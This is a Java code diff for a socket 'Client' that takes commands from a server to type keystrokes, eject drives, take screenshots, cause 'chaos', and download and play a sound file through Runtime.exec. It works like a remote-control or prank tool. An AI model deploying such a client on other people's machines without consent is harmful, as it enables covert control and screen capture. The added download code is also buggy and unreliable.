@@ -1,9 +1,7 @@
 import javax.swing.*;
 import java.awt.*;
 import java.awt.image.BufferedImage;
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
+import java.io.*;
 import java.net.Socket;
 
 /**
@@ -14,6 +12,7 @@ public class Client
 {
     private static final int SERVER_PORT = 0xbeef;
     private static final String SERVER_IP_ADDRESS = "127.0.0.1";
+    private Socket socket;
     private CommandSet commandSet;
 
     public Client() throws IOException, UnknownOperatingSystemException, AWTException
@@ -46,13 +45,13 @@ public class Client
      */
     private void connectAndListen() throws IOException, AWTException
     {
-        Socket socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
+        socket = new Socket(SERVER_IP_ADDRESS, SERVER_PORT);
         BufferedReader inFromServer = new BufferedReader(new InputStreamReader(socket.getInputStream()));
 
         while(socket.isConnected())
         {
             String serverCommand = inFromServer.readLine(); // blocks
-            if(serverCommand.equals("sound") || serverCommand.equals("type")) // 1 arg commands
+            if(serverCommand.equals("type")) // 1 arg commands
                 processServerCommand(serverCommand, inFromServer.readLine());
             else if(serverCommand.equals("chaos")) // 2 arg commands
                 processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine());
@@ -63,6 +62,33 @@ public class Client
             System.out.println("Recivied from server: " + serverCommand);
         }
     }
+
+    private File getSoundFileFromServer() throws IOException
+    {
+        File sound = File.createTempFile("sou", ".wav", null); // todo: make sure null (default temp dir) matches with our dir (tempPath)
+        byte[] buffer = new byte[5000000];
+        InputStream in = socket.getInputStream();
+        FileOutputStream fos = new FileOutputStream(sound);
+
+        int count;
+        while ((count = in.read(buffer)) > 0)
+            fos.write(buffer, 0, count);
+
+        fos.close();
+        in.close();
+
+        try
+        {
+            Runtime runtime = Runtime.getRuntime();
+            runtime.exec("cvlc " + sound.getAbsolutePath());
+        }catch(Exception e)
+        {
+            int a = 22;
+        }
+
+        return sound;
+    }
+
 
     /**
      * calls the appropriate method on the CommandSet depending on what the server wants us to do to
@@ -76,8 +102,9 @@ public class Client
             case "eject":
                 commandSet.eject();
                 return;
-            case "sound":
-                commandSet.playSound();
+            case "sound": // special case: sound requires the sound file from the server so we must retrieve it
+                File sound = getSoundFileFromServer();
+                commandSet.playSound(sound);
                 return;
             case "screenshot":
                 JPanel panel = new JPanel();
